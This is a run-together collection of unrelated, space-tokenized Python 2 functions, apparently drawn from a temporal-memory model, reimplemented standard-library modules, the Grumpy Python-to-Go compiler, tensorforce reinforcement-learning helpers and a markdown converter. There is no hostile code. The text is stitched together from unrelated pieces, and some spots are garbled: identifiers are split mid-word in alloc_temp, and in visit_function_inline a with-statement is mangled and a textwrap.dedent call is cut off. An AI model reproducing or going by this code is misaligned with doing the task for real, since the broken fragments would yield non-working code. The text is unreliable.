) self . infActiveState [ "candidate" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infPredictedState = { } self . infPredictedState [ "t" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infPredictedState [ "t-1" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infPredictedState [ "backup" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infPredictedState [ "candidate" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . cellConfidence = { } self . cellConfidence [ "t" ] = numpy . zeros ( stateShape , dtype = "float32" ) self . cellConfidence [ "t-1" ] = numpy . zeros ( stateShape , dtype = "float32" ) self . cellConfidence [ "candidate" ] = numpy . zeros ( stateShape , dtype = "float32" ) self . colConfidence = { } self . colConfidence [ "t" ] = numpy . zeros ( self . numberOfCols , dtype = "float32" ) self . colConfidence [ "t-1" ] = numpy . zeros ( self . numberOfCols , dtype = "float32" ) self . colConfidence [ "candidate" ] = numpy . zeros ( self . numberOfCols , dtype = "float32" )
def printParameters ( self ) : print "numberOfCols=" , self . numberOfCols print "cellsPerColumn=" , self . cellsPerColumn print "minThreshold=" , self . minThreshold print "newSynapseCount=" , self . newSynapseCount print "activationThreshold=" , self . activationThreshold print print "initialPerm=" , self . initialPerm print "connectedPerm=" , self . connectedPerm print "permanenceInc=" , self . permanenceInc print "permanenceDec=" , self . permanenceDec print "permanenceMax=" , self . permanenceMax print "globalDecay=" , self . globalDecay print print "doPooling=" , self . doPooling print "segUpdateValidDuration=" , self . segUpdateValidDuration print "pamLength=" , self . pamLength
def _updateAvgLearnedSeqLength ( self , prevSeqLength ) : if self . lrnIterationIdx < 100 : alpha = 0.5 else : alpha = 0.1 self . avgLearnedSeqLength = ( ( 1.0 - alpha ) * self . avgLearnedSeqLength + ( alpha * prevSeqLength ) )
def quote ( c ) : i = ord ( c ) return ESCAPE + HEX [ i // 16 ] + HEX [ i % 16 ]
def unhex ( s ) : bits = 0 for c in s : if '0' <= c <= '9' : i = ord ( '0' ) elif 'a' <= c <= 'f' : i = ord ( 'a' ) - 10 elif 'A' <= c <= 'F' : i = ord ( 'A' ) - 10 else : break bits = bits * 16 + ( ord ( c ) - i ) return bits
def encode ( input , output ) : while True : s = input . read ( MAXBINSIZE ) if not s : break while len ( s ) < MAXBINSIZE : ns = input . read ( MAXBINSIZE - len ( s ) ) if not ns : break s += ns line = binascii . b2a_base64 ( s ) output . write ( line )
def decode ( input , output ) : while True : line = input . readline ( ) if not line : break s = binascii . a2b_base64 ( line ) output . write ( s )
def encodestring ( s ) : pieces = [ ] for i in range ( 0 , len ( s ) , MAXBINSIZE ) : chunk = s [ i : i + MAXBINSIZE ] pieces . append ( binascii . b2a_base64 ( chunk ) ) return "" . join ( pieces )
def begin ( self ) : return Range ( self . source_buffer , self . begin_pos , self . begin_pos , expanded_from = self . expanded_from )
def end ( self ) : return Range ( self . source_buffer , self . end_pos , self . end_pos , expanded_from = self . expanded_from )
def column ( self ) : line , column = self . source_buffer . decompose_position ( self . begin_pos ) return column
def line ( self ) : line , column = self . source_buffer . decompose_position ( self . begin_pos ) return line
def source_lines ( self ) : return [ self . source_buffer . source_line ( line ) for line in range ( self . line ( ) , self . end ( ) . line ( ) + 1 ) ]
def visit ( self , obj ) : if isinstance ( obj , list ) : return [ self . visit ( elt ) for elt in obj ] elif isinstance ( obj , ast . AST ) : return self . _visit_one ( obj )
def generic_visit ( self , node ) : for field_name in node . _fields : setattr ( node , field_name , self . visit ( getattr ( node , field_name ) ) ) return node
def visit ( self , obj ) : if isinstance ( obj , list ) : return list ( filter ( lambda x : x is not None , map ( self . visit , obj ) ) ) elif isinstance ( obj , ast . AST ) : return self . _visit_one ( obj ) else : return obj
def _format_final_exc_line ( etype , value ) : valuestr = _some_str ( value ) if value is None or not valuestr : line = "%s\n" % etype else : line = "%s: %s\n" % ( etype , valuestr ) return line
def add_extension ( module , name , code ) : code = int ( code ) if not 1 <= code <= 0x7fffffff : raise ValueError , "code out of range" key = ( module , name ) if ( _extension_registry . get ( key ) == code and _inverted_registry . get ( code ) == key ) : return # Redundant registrations are benign if key in _extension_registry : raise ValueError ( "key %s is already registered with code %s" % ( key , _extension_registry [ key ] ) ) if code in _inverted_registry : raise ValueError ( "code %s is already in use for key %s" % ( code , _inverted_registry [ code ] ) ) _extension_registry [ key ] = code _inverted_registry [ code ] = key
def remove_extension ( module , name , code ) : key = ( module , name ) if ( _extension_registry . get ( key ) != code or _inverted_registry . get ( code ) != key ) : raise ValueError ( "key %s is not registered with code %s" % ( key , code ) ) del _extension_registry [ key ] del _inverted_registry [ code ] if code in _extension_cache : del _extension_cache [ code ]
def cmp_to_key ( mycmp ) : class K ( object ) : __slots__ = [ 'obj' ] def __init__ ( self , obj , * args ) : self . obj = obj def __lt__ ( self , other ) : return mycmp ( self . obj , other . obj ) < 0 def __gt__ ( self , other ) : return mycmp ( self . obj , other . obj ) > 0 def __eq__ ( self , other ) : return mycmp ( self . obj , other . obj ) == 0 def __le__ ( self , other ) : return mycmp ( self . obj , other . obj ) <= 0 def __ge__ ( self , other ) : return mycmp ( self . obj , other . obj ) >= 0 def __ne__ ( self , other ) : return mycmp ( self . obj , other . obj ) != 0 def __hash__ ( self ) : raise TypeError ( 'hash not implemented' ) return K
def unquote ( s ) : if len ( s ) > 1 : if s . startswith ( '"' ) and s . endswith ( '"' ) : return s [ 1 : - 1 ] . replace ( '\\\\' , '\\' ) . replace ( '\\"' , '"' ) if s . startswith ( '<' ) and s . endswith ( '>' ) : return s [ 1 : - 1 ] return s
def gotonext ( self ) : while self . pos < len ( self . field ) : if self . field [ self . pos ] in self . LWS + '\n\r' : self . pos = self . pos + 1 elif self . field [ self . pos ] == '(' : self . commentlist . append ( self . getcomment ( ) ) else : break
def getaddrspec ( self ) : aslist = [ ] self . gotonext ( ) while self . pos < len ( self . field ) : if self . field [ self . pos ] == '.' : aslist . append ( '.' ) self . pos += 1 elif self . field [ self . pos ] == '"' : aslist . append ( '"%s"' % self . getquote ( ) ) elif self . field [ self . pos ] in self . atomends : break else : aslist . append ( self . getatom ( ) ) self . gotonext ( ) if self . pos >= len ( self . field ) or self . field [ self . pos ] != '@' : return '' . join ( aslist ) aslist . append ( '@' ) self . pos += 1 self . gotonext ( ) return '' . join ( aslist ) + self . getdomain ( )
def getdomain ( self ) : sdlist = [ ] while self . pos < len ( self . field ) : if self . field [ self . pos ] in self . LWS : self . pos += 1 elif self . field [ self . pos ] == '(' : self . commentlist . append ( self . getcomment ( ) ) elif self . field [ self . pos ] == '[' : sdlist . append ( self . getdomainliteral ( ) ) elif self . field [ self . pos ] == '.' : self . pos += 1 sdlist . append ( '.' ) elif self . field [ self . pos ] in self . atomends : break else : sdlist . append ( self . getatom ( ) ) return '' . join ( sdlist )
def replace ( self , year = None , month = None , day = None ) : if year is None : year = self . _year if month is None : month = self . _month if day is None : day = self . _day return date . __new__ ( type ( self ) , year , month , day )
def replace ( self , hour = None , minute = None , second = None , microsecond = None , tzinfo = True ) : if hour is None : hour = self . hour if minute is None : minute = self . minute if second is None : second = self . second if microsecond is None : microsecond = self . microsecond if tzinfo is True : tzinfo = self . tzinfo return time . __new__ ( type ( self ) , hour , minute , second , microsecond , tzinfo )
def combine ( cls , date , time ) : if not isinstance ( date , _date_class ) : raise TypeError ( "date argument must be a date instance" ) if not isinstance ( time , _time_class ) : raise TypeError ( "time argument must be a time instance" ) return cls ( date . year , date . month , date . day , time . hour , time . minute , time . second , time . microsecond , time . tzinfo )
def time ( self ) : return time ( self . hour , self . minute , self . second , self . microsecond )
def timetz ( self ) : return time ( self . hour , self . minute , self . second , self . microsecond , self . _tzinfo )
def replace ( self , year = None , month = None , day = None , hour = None , minute = None , second = None , microsecond = None , tzinfo = True ) : if year is None : year = self . year if month is None : month = self . month if day is None : day = self . day if hour is None : hour = self . hour if minute is None : minute = self . minute if second is None : second = self . second if microsecond is None : microsecond = self . microsecond if tzinfo is True : tzinfo = self . tzinfo return datetime . __new__ ( type ( self ) , year , month , day , hour , minute , second , microsecond , tzinfo )
def concat ( a , b ) : if not hasattr ( a , '__getitem__' ) : msg = "'%s' object can't be concatenated" % type ( a ) . __name__ raise TypeError ( msg ) return a + b
def countOf ( a , b ) : count = 0 for i in a : if i == b : count += 1 return count
def indexOf ( a , b ) : for i , j in enumerate ( a ) : if j == b : return i else : raise ValueError ( 'sequence.index(x): x not in sequence' )
def iconcat ( a , b ) : if not hasattr ( a , '__getitem__' ) : msg = "'%s' object can't be concatenated" % type ( a ) . __name__ raise TypeError ( msg ) a += b return a
def encode_basestring ( s ) : def replace ( match ) : return ESCAPE_DCT [ match . group ( 0 ) ] return '"' + ESCAPE . sub ( replace , s ) + '"'
def escape ( pattern ) : s = list ( pattern ) alphanum = _alphanum for i , c in enumerate ( pattern ) : if c not in alphanum : if c == "\000" : s [ i ] = "\\000" else : s [ i ] = "\\" + c return pattern [ : 0 ] . join ( s )
def alloc_temp ( self , type_ = '*g.Object') :  for v in sorted ( self . free_temps , key = lambda k : k . name ) : if v . type_ == type_ : self . free_temps . remove ( v ) self . used_temps . add ( v ) return v self . temp_index += 1 name = 'Temp{:03d}'. f ormat( s elf. t emp_index)  v = expr . GeneratedTempVar ( self , name , type_ ) self . used_temps . add ( v ) return v
def free_temp ( self , v ) : self . used_temps . remove ( v ) self . free_temps . add ( v )
def _format_range_unified ( start , stop ) : # Per the diff spec at http://www.unix.org/single_unix_specification/ beginning = start + 1 # lines start numbering with one length = stop - start if length == 1 : # return '{}'.format(beginning) return '%s' % ( beginning ) if not length : beginning -= 1 # empty ranges begin at line just before the range return '%s,%s' % ( beginning , length )
def _format_range_context ( start , stop ) : # Per the diff spec at http://www.unix.org/single_unix_specification/ beginning = start + 1 # lines start numbering with one length = stop - start if not length : beginning -= 1 # empty ranges begin at line just before the range if length <= 1 : # return '{}'.format(beginning) return '%s' % ( beginning ) # return '{},{}'.format(beginning, beginning + length - 1) return '%s,%s' % ( beginning , beginning + length - 1 )
def _make ( cls , iterable , new = tuple . __new__ , len = len ) : result = new ( cls , iterable ) if len ( result ) != 3 : raise TypeError ( 'Expected 3 arguments, got %d' % len ( result ) ) return result
def _dump ( self , tag , x , lo , hi ) : for i in xrange ( lo , hi ) : yield '%s %s' % ( tag , x [ i ] )
def _make_prefix ( self ) : # Generate a unique anchor prefix so multiple tables # can exist on the same HTML page without conflicts. fromprefix = "from%d_" % HtmlDiff . _default_prefix toprefix = "to%d_" % HtmlDiff . _default_prefix HtmlDiff . _default_prefix += 1 # store prefixes so line format method has access self . _prefix = [ fromprefix , toprefix ]
def _convert_flags ( self , fromlist , tolist , flaglist , context , numlines ) : # all anchor names will be generated using the unique "to" prefix toprefix = self . _prefix [ 1 ] # process change flags, generating middle column of next anchors/links next_id = [ '' ] * len ( flaglist ) next_href = [ '' ] * len ( flaglist ) num_chg , in_change = 0 , False last = 0 for i , flag in enumerate ( flaglist ) : if flag : if not in_change : in_change = True last = i # at the beginning of a change, drop an anchor a few lines # (the context lines) before the change for the previous # link i = max ( [ 0 , i - numlines ] ) next_id [ i ] = ' id="difflib_chg_%s_%d"' % ( toprefix , num_chg ) # at the beginning of a change, drop a link to the next # change num_chg += 1 next_href [ last ] = '<a href="#difflib_chg_%s_%d">n</a>' % ( toprefix , num_chg ) else : in_change = False # check for cases where there is no content to avoid exceptions if not flaglist : flaglist = [ False ] next_id = [ '' ] next_href = [ '' ] last = 0 if context : fromlist = [ '<td></td><td>&nbsp;No Differences Found&nbsp;</td>' ] tolist = fromlist else : fromlist = tolist = [ '<td></td><td>&nbsp;Empty File&nbsp;</td>' ] # if not a change on first line, drop a link if not flaglist [ 0 ] : next_href [ 0 ] = '<a href="#difflib_chg_%s_0">f</a>' % toprefix # redo the last link to link to the top next_href [ last ] = '<a href="#difflib_chg_%s_top">t</a>' % ( toprefix ) return fromlist , tolist , flaglist , next_href , next_id
def _MakeParallelBenchmark ( p , work_func , * args ) : def Benchmark ( b ) : # pylint: disable=missing-docstring e = threading . Event ( ) def Target ( ) : e . wait ( ) for _ in xrange ( b . N / p ) : work_func ( * args ) threads = [ ] for _ in xrange ( p ) : t = threading . Thread ( target = Target ) t . start ( ) threads . append ( t ) b . ResetTimer ( ) e . set ( ) for t in threads : t . join ( ) return Benchmark
def visit_function_inline ( self , node ) : # First pass collects the names of locals used in this function. Do this in # a separate pass so that we know whether to resolve a name as a local or a # global during the second pass. func_visitor = block . FunctionBlockVisitor ( node ) for child in node . body : func_visitor . visit ( child ) func_block = block . FunctionBlock ( self . block , node . name , func_visitor . vars , func_visitor . is_generator ) visitor = StatementVisitor ( func_block , self . future_node ) # Indent so that the function body is aligned with the goto labels. with visitor . writer . indent_block ( ) : visitor . _visit_each ( node . body ) # pylint: disable=protected-access result = self . block . alloc_temp ( ) with self . block . alloc_temp ( '[]g.Param')   s  unc_args:  args = node . args argc = len ( args . args ) self . writer . write ( '{} = make([]g.Param, {})'. f ormat(  func_args . expr , argc ) ) # The list of defaults only contains args for which a default value is # specified so pad it with None to make it the same length as args. defaults = [ None ] * ( argc - len ( args . defaults ) ) + args . defaults for i , ( a , d ) in enumerate ( zip ( args . args , defaults ) ) : with self . visit_expr ( d ) if d else expr . nil_expr as default : tmpl = '$args[$i] = g.Param{Name: $name, Def: $default}' self . writer . write_tmpl ( tmpl , args = func_args . expr , i = i , name = util . go_str ( a . arg ) , default = default . expr ) flags = [ ] if args . vararg : flags . append ( 'g.CodeFlagVarArg')  if args . kwarg : flags . append ( 'g.CodeFlagKWArg')  # The function object gets written to a temporary writer because we need # it as an expression that we subsequently bind to some variable. self . writer . write_tmpl ( '$result = g.NewFunction(g.NewCode($name, $filename, $args, ' '$flags, func(F *g.Frame, Args []*g.Object) ' '(*g.Object, *g.BaseException) {',  result = result . name , name = util . go_str ( node . name ) , filename = util . go_str ( self . block . root . filename ) , args = func_args . expr , flags = ' | ' . join ( flags ) if flags else 0 ) with self . writer . indent_block ( ) : for var in func_block . vars . values ( ) : if var . type != block . Var . TYPE_GLOBAL : fmt = 'var {0} *g.Object = {1}; _ = {0}' self . writer . write ( fmt . format ( util . adjust_local_name ( var . name ) , var . init_expr ) ) self . writer . write_temp_decls ( func_block ) self . writer . write ( 'var R *g.Object; _ = R')  self . writer . write ( 'var E *g.BaseException; _ = E')  if func_block . is_generator : self . writer . write ( 'return g.NewGenerator(F, func(Sent *g.Object) ' '(*g.Object, *g.BaseException) {')  with self . writer . indent_block ( ) : self . writer . write_block ( func_block , visitor . writer . getvalue ( ) ) self . writer . write ( 'return nil, E')  self . writer . write ( '}).ToObject(), nil' ) else : self . writer . write_block ( func_block , visitor . writer . getvalue ( ) ) self . writer . write ( textwrap . dedent (   self . writer . write ( '}), F.Globals()).ToObject()')  return result
def listdir ( path ) : try : cached_mtime , list = cache [ path ] del cache [ path ] except KeyError : cached_mtime , list = - 1 , [ ] mtime = os . stat ( path ) . st_mtime if mtime != cached_mtime : list = os . listdir ( path ) list . sort ( ) cache [ path ] = mtime , list return list
def pformat ( o , indent = 1 , width = 80 , depth = None ) : return PrettyPrinter ( indent = indent , width = width , depth = depth ) . pformat ( o )
def Tok ( kind , loc = None ) : @ llrule ( loc , lambda parser : [ kind ] ) def rule ( parser ) : return parser . _accept ( kind ) return rule
def Loc ( kind , loc = None ) : @ llrule ( loc , lambda parser : [ kind ] ) def rule ( parser ) : result = parser . _accept ( kind ) if result is unmatched : return result return result . loc return rule
def Rule ( name , loc = None ) : @ llrule ( loc , lambda parser : getattr ( parser , name ) . expected ( parser ) ) def rule ( parser ) : return getattr ( parser , name ) ( ) return rule
def Expect ( inner_rule , loc = None ) : @ llrule ( loc , inner_rule . expected ) def rule ( parser ) : result = inner_rule ( parser ) if result is unmatched : expected = reduce ( list . __add__ , [ rule . expected ( parser ) for rule in parser . _errrules ] ) expected = list ( sorted ( set ( expected ) ) ) if len ( expected ) > 1 : expected = " or " . join ( [ ", " . join ( expected [ 0 : - 1 ] ) , expected [ - 1 ] ] ) elif len ( expected ) == 1 : expected = expected [ 0 ] else : expected = "(impossible)" error_tok = parser . _tokens [ parser . _errindex ] error = diagnostic . Diagnostic ( "fatal" , "unexpected {actual}: expected {expected}" , { "actual" : error_tok . kind , "expected" : expected } , error_tok . loc ) parser . diagnostic_engine . process ( error ) return result return rule
def Newline ( loc = None ) : @ llrule ( loc , lambda parser : [ "newline" ] ) def rule ( parser ) : result = parser . _accept ( "newline" ) if result is unmatched : return result return [ ] return rule
def _replace ( _self , * * kwds ) : result = _self . _make ( map ( kwds . pop , ( 'scheme' , 'netloc' , 'path' , 'query' , 'fragment' ) , _self ) ) if kwds : raise ValueError ( 'Got unexpected field names: %r' % kwds . keys ( ) ) return result
def isfile ( path ) : try : st = os . stat ( path ) except os . error : return False return stat . S_ISREG ( st . st_mode )
def isdir ( s ) : try : st = os . stat ( s ) except os . error : return False return stat . S_ISDIR ( st . st_mode )
def commonprefix ( m ) : if not m : return '' s1 = min ( m ) s2 = max ( m ) for i , c in enumerate ( s1 ) : if c != s2 [ i ] : return s1 [ : i ] return s1
def _bytelist2longBigEndian ( list ) : imax = len ( list ) // 4 hl = [ 0 ] * imax j = 0 i = 0 while i < imax : b0 = ord ( list [ j ] ) << 24 b1 = ord ( list [ j + 1 ] ) << 16 b2 = ord ( list [ j + 2 ] ) << 8 b3 = ord ( list [ j + 3 ] ) hl [ i ] = b0 | b1 | b2 | b3 i = i + 1 j = j + 4 return hl
def init ( self ) : self . length = 0 self . input = [ ] # Initial 160 bit message digest (5 times 32 bit). self . H0 = 0x67452301 self . H1 = 0xEFCDAB89 self . H2 = 0x98BADCFE self . H3 = 0x10325476 self . H4 = 0xC3D2E1F0
def _show_warning ( message , category , filename , lineno , file = None , line = None ) : if file is None : file = sys . stderr if file is None : # sys.stderr is None - warnings get lost return try : file . write ( formatwarning ( message , category , filename , lineno , line ) ) except ( IOError , UnicodeError ) : pass # the file (probably stderr) is invalid - this warning gets lost.
def formatwarning ( message , category , filename , lineno , line = None ) : try : unicodetype = unicode except NameError : unicodetype = ( ) try : message = str ( message ) except UnicodeEncodeError : pass s = "%s: %s: %s\n" % ( lineno , category . __name__ , message ) line = linecache . getline ( filename , lineno ) if line is None else line if line : line = line . strip ( ) if isinstance ( s , unicodetype ) and isinstance ( line , str ) : line = unicode ( line , 'latin1' ) s += "  %s\n" % line if isinstance ( s , unicodetype ) and isinstance ( filename , str ) : enc = sys . getfilesystemencoding ( ) if enc : try : filename = unicode ( filename , enc ) except UnicodeDecodeError : pass s = "%s:%s" % ( filename , s ) return s
def warn ( message , category = None , stacklevel = 1 ) : # Check if message is already a Warning object if isinstance ( message , Warning ) : category = message . __class__ # Check category argument if category is None : category = UserWarning assert issubclass ( category , Warning ) # Get context information try : caller = sys . _getframe ( stacklevel ) except ValueError : globals = sys . __dict__ lineno = 1 else : globals = caller . f_globals lineno = caller . f_lineno if '__name__' in globals : module = globals [ '__name__' ] else : module = "<string>" filename = globals . get ( '__file__' ) if filename : fnl = filename . lower ( ) if fnl . endswith ( ( ".pyc" , ".pyo" ) ) : filename = filename [ : - 1 ] else : if module == "__main__" : try : filename = sys . argv [ 0 ] except AttributeError : # embedded interpreters don't have sys.argv, see bug #839151 filename = '__main__' if not filename : filename = module registry = globals . setdefault ( "__warningregistry__" , { } ) warn_explicit ( message , category , filename , lineno , module , registry , globals )
def remove ( self , value ) : if value not in self : raise KeyError ( value ) self . discard ( value )
def pop ( self ) : it = iter ( self ) try : value = next ( it ) except StopIteration : raise KeyError self . discard ( value ) return value
def go_str ( value ) : io = StringIO . StringIO ( ) io . write ( '"' ) for c in value : if c in _ESCAPES : io . write ( _ESCAPES [ c ] ) elif c in _SIMPLE_CHARS : io . write ( c ) else : io . write ( r'\x{:02x}' . format ( ord ( c ) ) ) io . write ( '"' ) return io . getvalue ( )
def _dump_registry ( cls , file = None ) : print >> file , "Class: %s.%s" % ( cls . __module__ , cls . __name__ ) print >> file , "Inv.counter: %s" % ABCMeta . _abc_invalidation_counter for name in sorted ( cls . __dict__ . keys ( ) ) : if name . startswith ( "_abc_" ) : value = getattr ( cls , name ) print >> file , "%s: %r" % ( name , value )
def format_option_strings ( self , option ) : if option . takes_value ( ) : metavar = option . metavar or option . dest . upper ( ) short_opts = [ self . _short_opt_fmt % ( sopt , metavar ) for sopt in option . _short_opts ] long_opts = [ self . _long_opt_fmt % ( lopt , metavar ) for lopt in option . _long_opts ] else : short_opts = option . _short_opts long_opts = option . _long_opts if self . short_first : opts = short_opts + long_opts else : opts = long_opts + short_opts return ", " . join ( opts )
def reverse ( self ) : leftblock = self . left rightblock = self . right leftindex = self . leftndx rightindex = self . rightndx for i in range ( self . length // 2 ) : # Validate that pointers haven't met in the middle assert leftblock != rightblock or leftindex < rightindex # Swap ( rightblock [ rightindex ] , leftblock [ leftindex ] ) = ( leftblock [ leftindex ] , rightblock [ rightindex ] ) # Advance left block/index pair leftindex += 1 if leftindex == n : leftblock = leftblock [ RGTLNK ] assert leftblock is not None leftindex = 0 # Step backwards with the right block/index pair rightindex -= 1 if rightindex == - 1 : rightblock = rightblock [ LFTLNK ] assert rightblock is not None rightindex = n - 1
def findall ( self , string , pos = 0 , endpos = sys . maxint ) : matchlist = [ ] state = _State ( string , pos , endpos , self . flags ) while state . start <= state . end : state . reset ( ) state . string_position = state . start if not state . search ( self . _code ) : break match = SRE_Match ( self , state ) if self . groups == 0 or self . groups == 1 : item = match . group ( self . groups ) else : item = match . groups ( "" ) matchlist . append ( item ) if state . string_position == state . start : state . start += 1 else : state . start = state . string_position return matchlist
def split ( self , string , maxsplit = 0 ) : splitlist = [ ] state = _State ( string , 0 , sys . maxint , self . flags ) n = 0 last = state . start while not maxsplit or n < maxsplit : state . reset ( ) state . string_position = state . start if not state . search ( self . _code ) : break if state . start == state . string_position : # zero-width match if last == state . end : # or end of string break state . start += 1 continue splitlist . append ( string [ last : state . start ] ) # add groups (if any) if self . groups : match = SRE_Match ( self , state ) # TODO: Use .extend once it is implemented. # splitlist.extend(list(match.groups(None))) splitlist += ( list ( match . groups ( None ) ) ) n += 1 last = state . start = state . string_position splitlist . append ( string [ last : state . end ] ) return splitlist
def finditer ( self , string , pos = 0 , endpos = sys . maxint ) : scanner = self . scanner ( string , pos , endpos ) return iter ( scanner . search , None )
def _create_regs ( self , state ) : regs = [ ( state . start , state . string_position ) ] for group in range ( self . re . groups ) : mark_index = 2 * group if mark_index + 1 < len ( state . marks ) and state . marks [ mark_index ] is not None and state . marks [ mark_index + 1 ] is not None : regs . append ( ( state . marks [ mark_index ] , state . marks [ mark_index + 1 ] ) ) else : regs . append ( ( - 1 , - 1 ) ) return tuple ( regs )
def unexpo ( intpart , fraction , expo ) : if expo > 0 : # Move the point left f = len ( fraction ) intpart , fraction = intpart + fraction [ : expo ] , fraction [ expo : ] if expo > f : intpart = intpart + '0' * ( expo - f ) elif expo < 0 : # Move the point right i = len ( intpart ) intpart , fraction = intpart [ : expo ] , intpart [ expo : ] + fraction if expo < - i : fraction = '0' * ( - expo - i ) + fraction return intpart , fraction
def roundfrac ( intpart , fraction , digs ) : f = len ( fraction ) if f <= digs : return intpart , fraction + '0' * ( digs - f ) i = len ( intpart ) if i + digs < 0 : return '0' * - digs , '' total = intpart + fraction nextdigit = total [ i + digs ] if nextdigit >= '5' : # Hard case: increment last digit, may have carry! n = i + digs - 1 while n >= 0 : if total [ n ] != '9' : break n = n - 1 else : total = '0' + total i = i + 1 n = 0 total = total [ : n ] + chr ( ord ( total [ n ] ) + 1 ) + '0' * ( len ( total ) - n - 1 ) intpart , fraction = total [ : i ] , total [ i : ] if digs >= 0 : return intpart , fraction [ : digs ] else : return intpart [ : digs ] + '0' * - digs , ''
def filter ( names , pat ) : import os # import posixpath result = [ ] # pat=os.path.normcase(pat) try : re_pat = _cache [ pat ] except KeyError : res = translate ( pat ) if len ( _cache ) >= _MAXCACHE : # _cache.clear() globals ( ) [ '_cache' ] = { } _cache [ pat ] = re_pat = re . compile ( res ) match = re_pat . match # if os.path is posixpath: if 1 : # normcase on posix is NOP. Optimize it away from the loop. for name in names : if match ( name ) : result . append ( name ) else : for name in names : if match ( os . path . normcase ( name ) ) : result . append ( name ) return result
def calculate_transitive_deps ( modname , script , gopath ) : deps = set ( ) def calc ( modname , script ) : if modname in deps : return deps . add ( modname ) for imp in collect_imports ( modname , script , gopath ) : if imp . is_native : deps . add ( imp . name ) continue parts = imp . name . split ( '.' ) calc ( imp . name , imp . script ) if len ( parts ) == 1 : continue # For submodules, the parent packages are also deps. package_dir , filename = os . path . split ( imp . script ) if filename == '__init__.py' : package_dir = os . path . dirname ( package_dir ) for i in xrange ( len ( parts ) - 1 , 0 , - 1 ) : modname = '.' . join ( parts [ : i ] ) script = os . path . join ( package_dir , '__init__.py' ) calc ( modname , script ) package_dir = os . path . dirname ( package_dir ) calc ( modname , script ) deps . remove ( modname ) return deps
def _make_future_features ( node ) : assert isinstance ( node , ast . ImportFrom ) assert node . module == '__future__' features = FutureFeatures ( ) for alias in node . names : name = alias . name if name in _FUTURE_FEATURES : if name not in _IMPLEMENTED_FUTURE_FEATURES : msg = 'future feature {} not yet implemented by grumpy' . format ( name ) raise util . ParseError ( node , msg ) setattr ( features , name , True ) elif name == 'braces' : raise util . ParseError ( node , 'not a chance' ) elif name not in _REDUNDANT_FUTURE_FEATURES : msg = 'future feature {} is not defined' . format ( name ) raise util . ParseError ( node , msg ) return features
def parse_future_features ( mod ) : assert isinstance ( mod , ast . Module ) found_docstring = False for node in mod . body : if isinstance ( node , ast . ImportFrom ) : if node . module == '__future__' : return node , _make_future_features ( node ) break elif isinstance ( node , ast . Expr ) and not found_docstring : if not isinstance ( node . value , ast . Str ) : break found_docstring = True else : break return None , FutureFeatures ( )
def from_spec ( spec , kwargs = None ) : baseline = util . get_object ( obj = spec , predefined_objects = tensorforce . core . baselines . baselines , kwargs = kwargs ) assert isinstance ( baseline , Baseline ) return baseline
def from_spec ( spec , kwargs = None ) : layer = util . get_object ( obj = spec , predefined_objects = tensorforce . core . networks . layers , kwargs = kwargs ) assert isinstance ( layer , Layer ) return layer
def from_spec ( spec , kwargs ) : env = tensorforce . util . get_object ( obj = spec , predefined_objects = tensorforce . environments . environments , kwargs = kwargs ) assert isinstance ( env , Environment ) return env
def setup ( app ) : global _is_sphinx _is_sphinx = True app . add_config_value ( 'no_underscore_emphasis' , False , 'env' ) app . add_source_parser ( '.md' , M2RParser ) app . add_directive ( 'mdinclude' , MdInclude )
def output_image_link ( self , m ) : return self . renderer . image_link ( m . group ( 'url' ) , m . group ( 'target' ) , m . group ( 'alt' ) )
def output_eol_literal_marker ( self , m ) : marker = ':' if m . group ( 1 ) is None else '' return self . renderer . eol_literal_marker ( marker )
def WorkerAgentGenerator ( agent_class ) : # Support special case where class is given as type-string (AgentsDictionary) or class-name-string. if isinstance ( agent_class , str ) : agent_class = AgentsDictionary . get ( agent_class ) # Last resort: Class name given as string? if not agent_class and agent_class . find ( '.' ) != - 1 : module_name , function_name = agent_class . rsplit ( '.' , 1 ) module = importlib . import_module ( module_name ) agent_class = getattr ( module , function_name ) class WorkerAgent ( agent_class ) : def __init__ ( self , model = None , * * kwargs ) : # Set our model externally. self . model = model # Be robust against `network` coming in from kwargs even though this agent doesn't have one if not issubclass ( agent_class , LearningAgent ) : kwargs . pop ( "network" ) # Call super c'tor (which will call initialize_model and assign self.model to the return value). super ( WorkerAgent , self ) . __init__ ( * * kwargs ) def initialize_model ( self ) : # Return our model (already given and initialized). return self . model return WorkerAgent
def _wait_state ( self , state , reward , terminal ) : while state == [ None ] or not state : state , terminal , reward = self . _execute ( dict ( key = 0 ) ) return state , terminal , reward
def from_spec ( spec , kwargs = None ) : optimizer = util . get_object ( obj = spec , predefined_objects = tensorforce . core . optimizers . optimizers , kwargs = kwargs ) assert isinstance ( optimizer , Optimizer ) return optimizer
def register_saver_ops ( self ) : variables = self . get_savable_variables ( ) if variables is None or len ( variables ) == 0 : self . _saver = None return base_scope = self . _get_base_variable_scope ( ) variables_map = { strip_name_scope ( v . name , base_scope ) : v for v in variables } self . _saver = tf . train . Saver ( var_list = variables_map , reshape = False , sharded = False , max_to_keep = 5 , keep_checkpoint_every_n_hours = 10000.0 , name = None , restore_sequentially = False , saver_def = None , builder = None , defer_build = False , allow_empty = True , write_version = tf . train . SaverDef . V2 , pad_step_number = False , save_relative_paths = True )
def from_spec ( spec , kwargs = None ) : if isinstance ( spec , dict ) : spec = [ spec ] stack = PreprocessorStack ( ) for preprocessor_spec in spec : # need to deep copy, otherwise will add first processors spec_ to kwargs to second processor preprocessor_kwargs = copy . deepcopy ( kwargs ) preprocessor = util . get_object ( obj = preprocessor_spec , predefined_objects = tensorforce . core . preprocessors . preprocessors , kwargs = preprocessor_kwargs ) assert isinstance ( preprocessor , Preprocessor ) stack . preprocessors . append ( preprocessor ) return stack
def as_local_model ( self ) : super ( MemoryModel , self ) . as_local_model ( ) self . optimizer_spec = dict ( type = 'global_optimizer' , optimizer = self . optimizer_spec )
def from_spec ( spec , kwargs = None ) : distribution = util . get_object ( obj = spec , predefined_objects = tensorforce . core . distributions . distributions , kwargs = kwargs ) assert isinstance ( distribution , Distribution ) return distribution
def from_spec ( spec , kwargs ) : agent = util . get_object ( obj = spec , predefined_objects = tensorforce . agents . agents , kwargs = kwargs ) assert isinstance ( agent , Agent ) return agent
def from_spec ( spec , kwargs = None ) : network = util . get_object ( obj = spec , default_object = LayeredNetwork , kwargs = kwargs ) assert isinstance ( network , Network ) return network
def move ( self , external_index , new_priority ) : index = external_index + ( self . _capacity - 1 ) return self . _move ( index , new_priority )
